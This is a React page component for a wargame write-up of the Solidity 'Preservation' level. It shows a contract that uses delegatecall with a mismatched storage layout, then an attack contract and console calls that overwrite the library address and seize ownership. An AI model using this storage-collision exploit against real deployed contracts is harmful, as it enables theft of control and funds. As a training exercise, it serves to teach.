import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Preservation = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  contract Preservation {
  
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
  
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
      timeZone1Library = _timeZone1LibraryAddress; 
      timeZone2Library = _timeZone2LibraryAddress; 
      owner = msg.sender;
    }
   
    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
      timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
  
    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
      timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
  }
  
  // Simple library contract to set the time
  contract LibraryContract {
  
    // stores a timestamp 
    uint storedTime;  
  
    function setTime(uint _time) public {
      storedTime = _time;
    }
  }`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  contract PreservationAttack  {
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner;
  
      function setTime(uint _time) public {
          owner = msg.sender;
      }
  }

  await contract.setFirstTime('0xfF5F7B86cE60BAE86E90327D96944AaC2783a6D0');

  await contract.setFirstTime(0);
`;

  return (
    <div>
      <h1 className="headerText">Preservation</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="There is the delegate call, but implementation and proxt don't have same structure of variables, so we can acces to timeZone1Library and set as library our
          PreservationAttack contract, and after that get ownership of the contract."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Preservation;
